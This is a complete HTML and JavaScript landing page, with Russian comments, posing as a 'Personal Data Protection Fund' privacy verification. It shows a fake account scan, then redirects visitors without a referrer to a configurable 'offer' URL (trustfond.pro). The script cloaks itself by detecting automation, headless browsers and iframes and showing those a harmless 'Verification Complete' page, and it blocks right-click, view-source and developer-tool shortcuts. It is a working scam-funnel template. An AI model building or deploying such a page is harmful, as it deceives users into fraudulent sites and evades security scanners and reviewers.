<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="robots" content="noindex, nofollow">
    <meta name="referrer" content="no-referrer">
    <title>Privacy Check</title>
    <style>
        :root {
            --bg: #f5f5f7;
            --card-bg: #ffffff;
            --text: #1d1d1f;
            --sub: #6e6e73;
            --border: #e8e8ed;
            --accent: #1f425f;
            --accent-light: rgba(31, 66, 95, 0.06);
            --green: #28a745;
            --radius: 14px;
            --shadow: 0 1px 3px rgba(0,0,0,0.04), 0 6px 20px rgba(0,0,0,0.06);
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: var(--bg);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            min-height: 100dvh;
            padding: 20px 16px;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
            touch-action: manipulation;
        }
        
        .container {
            width: 100%;
            max-width: 480px;
        }
        
        .card {
            background: var(--card-bg);
            border-radius: var(--radius);
            padding: 36px 24px 28px;
            box-shadow: var(--shadow);
            text-align: center;
        }
        
        .shield-icon {
            width: 52px;
            height: 52px;
            margin: 0 auto 18px;
            background: var(--accent-light);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 26px;
        }
        
        .title {
            font-size: 20px;
            font-weight: 600;
            color: var(--text);
            letter-spacing: -0.02em;
            margin-bottom: 8px;
        }
        
        .subtitle {
            font-size: 14px;
            color: var(--sub);
            line-height: 1.5;
            margin-bottom: 10px;
        }
        
        .reference-row {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-bottom: 24px;
            font-size: 13px;
            color: var(--sub);
        }
        
        .reference-row span {
            font-family: 'SF Mono', 'Menlo', 'Consolas', monospace;
            font-weight: 500;
            color: #555;
        }
        
        .progress-wrap {
            margin-bottom: 8px;
        }
        
        .progress-label {
            font-size: 13px;
            color: var(--sub);
            margin-bottom: 8px;
            font-weight: 500;
        }
        
        .progress-outer {
            width: 100%;
            height: 5px;
            background: #ececf0;
            border-radius: 3px;
            overflow: hidden;
        }
        
        .progress-inner {
            height: 100%;
            width: 0%;
            background: var(--accent);
            border-radius: 3px;
            transition: width 0.2s ease;
        }
        
        .progress-steps {
            display: flex;
            justify-content: space-between;
            margin-top: 8px;
            font-size: 10px;
            color: #b0b0b8;
        }
        
        .progress-steps span.done {
            color: var(--accent);
            font-weight: 600;
        }
        
        .footer-note {
            text-align: center;
            font-size: 11px;
            color: #c0c0c8;
            margin-top: 20px;
            line-height: 1.5;
        }
        
        /* Лоадер */
        .loader-wrap {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 14px;
            padding: 40px 20px;
            background: var(--card-bg);
            border-radius: var(--radius);
            box-shadow: var(--shadow);
        }
        
        .loader-spin {
            width: 32px;
            height: 32px;
            border: 3px solid #e8e8ed;
            border-top: 3px solid var(--accent);
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .loader-text {
            font-size: 14px;
            color: var(--sub);
        }
        
        /* Анимация */
        @keyframes fadeUp {
            from { opacity: 0; transform: translateY(8px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .fade {
            opacity: 0;
            animation: fadeUp 0.4s ease forwards;
        }
        .f1 { animation-delay: 0.05s; }
        .f2 { animation-delay: 0.12s; }
        .f3 { animation-delay: 0.20s; }
        .f4 { animation-delay: 0.28s; }
        .f5 { animation-delay: 0.36s; }
        
        /* Нейтральная страница */
        .neutral-icon {
            font-size: 44px;
            margin-bottom: 14px;
        }
        .neutral-title {
            font-size: 19px;
            font-weight: 600;
            color: var(--text);
            margin-bottom: 8px;
        }
        .neutral-sub {
            font-size: 14px;
            color: var(--sub);
            line-height: 1.5;
        }
        
    </style>
</head>
<body>

    <div class="container" id="app">
        <!-- Лоадер -->
        <div class="loader-wrap" id="loader">
            <div class="loader-spin"></div>
            <div class="loader-text">Establishing secure connection...</div>
        </div>
        
        <!-- Контент -->
        <div id="content" style="display: none;">
            <div class="card">
                
                <div class="shield-icon fade f1">🛡</div>
                
                <h1 class="title fade f2">Data Privacy Verification</h1>
                <p class="subtitle fade f2">
                    We are checking your account
                </p>
                
                <div class="reference-row fade f3">
                    Reference: <span id="ref-id">loading...</span>
                </div>
                
                <div class="progress-wrap fade f4">
                    <div class="progress-label" id="progress-label">Initializing verification...</div>
                    <div class="progress-outer">
                        <div class="progress-inner" id="progress-bar"></div>
                    </div>
                    <div class="progress-steps">
                        <span id="step1">Connecting</span>
                        <span id="step2">Scanning</span>
                        <span id="step3">Verifying</span>
                        <span id="step4">Redirecting</span>
                    </div>
                </div>
                
            </div>
            
            <div class="footer-note fade f5">
                🔒 Secure channel &bull; 256-bit encrypted<br>
                Personal Data Protection Fund &bull; 2026
            </div>
        </div>
    </div>

    <script>
    // ============================================
    // НАСТРОЙКИ
    // ============================================
    var FINAL_URL = 'https://trustfond.pro/'; // ← ЗАМЕНИ НА URL ОФФЕРА
    var DELAY_BEFORE_SHOW = 2000;
    var PROGRESS_STEPS = 4;
    var STEP_DURATION = 900; // мс на шаг (общее время ~3.6 сек)
    
    // ============================================
    // ПАРАМЕТРЫ URL
    // ============================================
    function getParams() {
        var params = new URLSearchParams(window.location.search);
        return {
            token: params.get('token') || params.get('id') || params.get('d') || generateRef(),
            all: window.location.search || ''
        };
    }
    
    var urlParams = getParams();
    
    function generateRef() {
        var chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
        var result = '';
        for (var i = 0; i < 8; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return 'REF-' + result;
    }
    
    // ============================================
    // ПРОВЕРКА НА БОТА
    // ============================================
    function isRealUser() {
        if (navigator.webdriver === true) return false;
        if (!navigator.languages || navigator.languages.length === 0) return false;
        if (screen.width < 150 || screen.height < 150) return false;
        if ((screen.width === 1 && screen.height === 1) || (screen.width === 0 && screen.height === 0)) return false;
        
        var ua = navigator.userAgent;
        var isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(ua);
        var hasTouch = ('ontouchstart' in window || navigator.maxTouchPoints > 0);
        var hasMotion = ('DeviceMotionEvent' in window || 'DeviceOrientationEvent' in window);
        
        if (isMobile && (hasTouch || hasMotion)) return true;
        
        if (!isMobile) {
            var hasPlugins = (navigator.plugins && navigator.plugins.length > 0);
            var hasMime = (navigator.mimeTypes && navigator.mimeTypes.length > 0);
            var hasChrome = (typeof window.chrome !== 'undefined' && window.chrome);
            if (!hasPlugins && !hasMime && !hasChrome) return false;
            if (navigator.hardwareConcurrency === 0) return false;
        }
        
        return true;
    }
    
    // ============================================
    // НЕЙТРАЛЬНАЯ СТРАНИЦА ДЛЯ БОТОВ
    // ============================================
    function showNeutral() {
        document.getElementById('loader').style.display = 'none';
        var c = document.getElementById('content');
        c.style.display = 'block';
        c.innerHTML = '<div class="card"><div class="neutral-icon">✓</div><div class="neutral-title">Verification Complete</div><div class="neutral-sub">Your privacy check has been processed. No further action is needed.</div></div>';
    }
    
    // ============================================
    // ПОКАЗ РЕАЛЬНОГО КОНТЕНТА
    // ============================================
    var userIsReal = false;
    
    function showReal() {
        userIsReal = true;
        document.getElementById('ref-id').textContent = urlParams.token;
        document.getElementById('loader').style.display = 'none';
        document.getElementById('content').style.display = 'block';
        
        startProgress();
    }
    
    // ============================================
    // ПРОГРЕСС-БАР
    // ============================================
    function startProgress() {
        var bar = document.getElementById('progress-bar');
        var label = document.getElementById('progress-label');
        var steps = ['step1', 'step2', 'step3', 'step4'];
        
        var stepLabels = [
            'Initializing verification...',
            'Scanning databases...',
            'Verifying your records...',
            'Redirecting to secure portal...'
        ];
        
        var currentStep = 0;
        
        function runStep() {
            if (currentStep >= PROGRESS_STEPS) {
                // Прогресс завершён — редирект
                doRedirect();
                return;
            }
            
            var percent = Math.round(((currentStep + 1) / PROGRESS_STEPS) * 100);
            bar.style.width = percent + '%';
            label.textContent = stepLabels[currentStep];
            
            // Подсвечиваем пройденные шаги
            for (var i = 0; i < steps.length; i++) {
                var el = document.getElementById(steps[i]);
                if (i <= currentStep) {
                    el.classList.add('done');
                }
            }
            
            currentStep++;
            setTimeout(runStep, STEP_DURATION);
        }
        
        runStep();
    }
    
    // ============================================
    // РЕДИРЕКТ БЕЗ РЕФЕРЕРА
    // ============================================
    function doRedirect() {
        var targetUrl = FINAL_URL + urlParams.all;
        
        // Метод 1: скрытая форма
        var form = document.createElement('form');
        form.method = 'GET';
        form.action = targetUrl;
        form.style.display = 'none';
        document.body.appendChild(form);
        
        setTimeout(function() {
            form.submit();
        }, 100);
        
        // Метод 2: fallback
        setTimeout(function() {
            window.location.replace(targetUrl);
        }, 1500);
    }
    
    // ============================================
    // ЗАПУСК
    // ============================================
    setTimeout(function() {
        if (isRealUser()) {
            showReal();
        } else {
            showNeutral();
        }
    }, DELAY_BEFORE_SHOW);
    
    // ============================================
    // ЗАЩИТЫ
    // ============================================
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
        return false;
    });
    
    document.addEventListener('keydown', function(e) {
        if ((e.ctrlKey && e.key === 'u') || (e.ctrlKey && e.shiftKey && e.key === 'I') || e.key === 'F12') {
            e.preventDefault();
            return false;
        }
    });
    
    if (window.top !== window.self) {
        document.getElementById('loader').style.display = 'none';
        showNeutral();
    }
    </script>

</body>
</html>
